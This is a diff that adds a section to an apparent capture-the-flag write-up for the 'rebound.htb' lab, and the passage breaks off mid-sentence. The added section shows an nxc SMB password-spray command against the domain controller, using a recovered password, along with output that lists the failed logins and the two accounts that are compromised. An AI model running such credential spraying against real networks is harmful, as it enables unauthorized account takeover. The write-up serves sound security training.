@@ -223,4 +223,25 @@ SMB         10.129.14.17    445    DC01             Shared          READ
 SMB         10.129.14.17    445    DC01             SYSVOL          READ            Logon server share
 ```
 This user is compromised, no interesting access on shares
-
+# Password spray leads to user compromise
+```python
+nxc smb dc01.rebound.htb -u users.txt -p '1GR8t@$$4u' --continue-on-success 
+SMB         10.129.14.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
+SMB         10.129.14.17    445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
+SMB         10.129.14.17    445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
+```
+There is another user using the same password a
